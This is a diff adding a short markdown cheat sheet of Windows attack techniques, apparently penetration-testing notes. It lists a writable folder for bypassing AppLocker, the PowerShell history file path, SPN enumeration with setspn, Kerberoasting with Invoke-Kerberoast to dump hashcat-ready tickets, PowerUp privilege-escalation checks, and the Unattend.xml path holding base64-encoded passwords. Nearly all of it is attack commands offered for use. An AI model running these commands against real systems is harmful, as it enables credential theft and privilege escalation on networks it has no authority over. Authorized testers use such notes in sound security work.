@@ -1,0 +1,24 @@
+## Bypass Windows Applocker
+
+- Safer location for executing binaries.
+ `C:\Windows\System32\spool\drivers\color`
+
+- Windows Powershell saves all previous commands into a file called "ConsoleHost_history".
+  `\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+
+  ## Kerberos
+- Extract all accounts in the SPN.
+ `setspn -T medin -Q ​ */* `
+
+-  Use [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1) and get a ticket.
+ `Invoke-Kerberoast -OutputFormat hashcat ​ |fl`
+
+##  Privilege Escalation
+
+- Use [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
+  ```powershell
+   . .\PowerUp.ps1
+  Invoke-AllChecks
+  ```
+- Location where users' passwords are stored in base64 encoding.
+  `C:\Windows\Panther\Unattend\Unattended.xml`
